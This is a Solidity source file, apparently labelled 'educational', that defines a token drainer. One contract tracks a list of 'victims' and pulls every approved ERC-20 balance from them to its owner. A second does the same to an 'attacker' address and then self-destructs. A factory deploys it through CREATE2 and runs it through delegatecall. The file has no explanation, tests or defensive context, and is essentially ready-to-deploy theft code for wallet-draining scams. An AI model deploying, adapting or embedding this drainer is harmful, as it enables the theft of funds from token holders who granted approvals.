// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

contract EdukasiDrainV2 {
    address public owner;
    address[] public supportedTokens;
    mapping(address => bool) public isTokenSupported;
    mapping(address => bool) public isVictim;
    address[] public victims;
    
    event Drained(address indexed token, address indexed from, uint256 amount);
    
    constructor(address[] memory _tokens) {
        owner = msg.sender;
        for (uint i = 0; i < _tokens.length; i++) {
            supportedTokens.push(_tokens[i]);
            isTokenSupported[_tokens[i]] = true;
        }
    }
    
    function addVictims(address[] calldata _victims) external {
        require(msg.sender == owner, "!owner");
        for (uint i = 0; i < _victims.length; i++) {
            if (!isVictim[_victims[i]]) {
                isVictim[_victims[i]] = true;
                victims.push(_victims[i]);
            }
        }
    }
    
    function drainAll() external returns (uint256 total) {
        require(msg.sender == owner, "!owner");
        for (uint v = 0; v < victims.length; v++) {
            address user = victims[v];
            for (uint t = 0; t < supportedTokens.length; t++) {
                address token = supportedTokens[t];
                uint256 allow = IERC20(token).allowance(user, address(this));
                if (allow == 0) continue;
                uint256 balance = IERC20(token).balanceOf(user);
                if (balance == 0) continue;
                uint256 amount = allow < balance ? allow : balance;
                IERC20(token).transferFrom(user, owner, amount);
                total += amount;
                emit Drained(token, user, amount);
            }
        }
    }
}

contract EdukasiExploit {
    address public drainContract;
    
    constructor(address _drain) {
        drainContract = _drain;
    }
    
    function execute(address token, address[] calldata _victims, address attacker) external {
        require(msg.sender == drainContract, "!drain");
        for (uint i = 0; i < _victims.length; i++) {
            address user = _victims[i];
            uint256 allow = IERC20(token).allowance(user, drainContract);
            if (allow == 0) continue;
            uint256 balance = IERC20(token).balanceOf(user);
            if (balance == 0) continue;
            uint256 amount = allow < balance ? allow : balance;
            IERC20(token).transferFrom(user, attacker, amount);
        }
        selfdestruct(payable(attacker));
    }
}

contract EdukasiFactory {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function deployExploit(bytes32 salt, address drainAddr) external returns (address) {
        require(msg.sender == owner, "!owner");
        EdukasiExploit exploit = new EdukasiExploit{salt: salt}(drainAddr);
        return address(exploit);
    }
    
    function runExploit(address exploit, address token, address[] calldata _victims, address attacker) external {
        require(msg.sender == owner, "!owner");
        (bool success, ) = exploit.delegatecall(
            abi.encodeWithSignature("execute(address,address[],address)", token, _victims, attacker)
        );
        require(success, "exploit failed");
    }
}
